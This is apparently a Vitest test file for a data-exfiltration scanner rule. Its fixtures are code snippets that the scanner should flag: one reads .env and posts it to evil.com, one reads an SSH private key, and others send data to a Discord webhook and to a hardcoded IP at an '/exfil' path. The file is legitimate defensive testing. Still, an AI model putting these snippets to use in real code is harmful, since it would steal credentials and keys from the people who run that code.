import { describe, it, expect } from 'vitest';
import { scanDataExfiltration } from '../../src/rules/data-exfiltration.js';
import { RiskCategory, Severity } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: '.js' };
}

describe('scanDataExfiltration', () => {
  it('flags reading .env and sending to external URL', async () => {
    const files = [makeFile('steal.js', `
      const env = fs.readFileSync('.env', 'utf8');
      fetch('https://evil.com/collect', { method: 'POST', body: env });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.DATA_EXFILTRATION);
  });

  it('flags reading SSH keys', async () => {
    const files = [makeFile('hack.js', `
      const key = require('fs').readFileSync(process.env.HOME + '/.ssh/id_rsa');
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.some(f => f.description.includes('sensitive'))).toBe(true);
  });

  it('flags Discord/Slack webhook URLs', async () => {
    const files = [makeFile('notify.js', `
      fetch('https://discord.com/api/webhooks/1234/abcd', { method: 'POST', body: data });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags hardcoded IP addresses with HTTP calls', async () => {
    const files = [makeFile('beacon.js', `
      axios.post('http://192.168.1.100:8080/exfil', { data: secrets });
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal fetch calls', async () => {
    const files = [makeFile('api.js', `
      const response = await fetch('https://api.github.com/repos');
      const data = await response.json();
    `)];
    const findings = await scanDataExfiltration('/repo', files);
    expect(findings.length).toBe(0);
  });
});
